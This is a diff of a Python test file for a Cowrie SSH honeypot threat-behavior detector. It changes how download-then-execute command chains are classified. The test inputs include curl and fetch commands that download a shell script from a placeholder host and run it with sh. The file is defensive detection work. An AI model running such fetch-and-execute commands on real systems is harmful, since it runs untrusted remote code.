@@ -65,7 +65,7 @@ def test_trusted_behavior_policy_is_valid_and_records_provenance() -> None:
     assert summary == {
         "schema_version": "threat_hypothesis_behavior_policy.v1",
         "policy_id": "cowrie-ssh-threat-hypothesis-behavior",
-        "version": "2026-07-29-sensitive-read-v1",
+        "version": "2026-07-30-direct-transfer-v1",
         "enabled": True,
         "reviewed": True,
         "review_status": "approved for scoped Cowrie SSH analysis",
@@ -146,7 +146,7 @@ def test_disabled_policy_retains_direct_events_but_suppresses_behavior_claims() 
     assert report["hypothesis_sets"] == []
 
 
-def test_new_remote_executable_can_be_added_without_python_changes() -> None:
+def test_new_remote_executable_remains_context_but_cannot_bypass_typed_transfer() -> None:
     commands = [
         "fetch https://example.invalid/a.sh -o /tmp/a.sh",
         "sh /tmp/a.sh",
@@ -164,14 +164,15 @@ def test_new_remote_executable_can_be_added_without_python_changes() -> None:
     assert validate_behavior_policy(policy) == []
 
     report = _session_report(commands, policy_document=policy)
-    assert "connected_transfer_execution" in _finding_types(report)
+    assert "connected_transfer_execution" not in _finding_types(report)
+    assert "attempted_artifact_execution" in _finding_types(report)
     observations = report["canonical_evidence"]["observations"]
     assert len(observations) == 2
     assert report["canonical_evidence"]["connected_behavior_chains"]
     assert report["provenance"]["behavior_policy"]["load_status"] == "provided"
 
 
-def test_connected_claim_precedence_can_be_extended_without_python_changes() -> None:
+def test_connected_transfer_rule_cannot_bypass_typed_family_containment() -> None:
     policy = deepcopy(_policy())
     policy["policy"]["claims"]["connected"].insert(0, {
         "rule_id": "reviewed-transfer-execution-test-rule",
@@ -189,11 +190,10 @@ def test_connected_claim_precedence_can_be_extended_without_python_changes() -> 
         ["curl https://example.invalid/a.sh -o /tmp/a.sh", "sh /tmp/a.sh"],
         policy_document=policy,
     )
-    finding = report["behavioral_findings"][0]
-    assert finding["finding_type"] == "reviewed_transfer_execution_observation"
-    assert finding["behavior_policy_rule_id"] == (
-        "reviewed-transfer-execution-test-rule"
+    assert "reviewed_transfer_execution_observation" not in _finding_types(
+        report
     )
+    assert "attempted_artifact_execution" in _finding_types(report)
 
 
 def test_policy_provenance_is_exposed_across_canonical_sections() -> None:
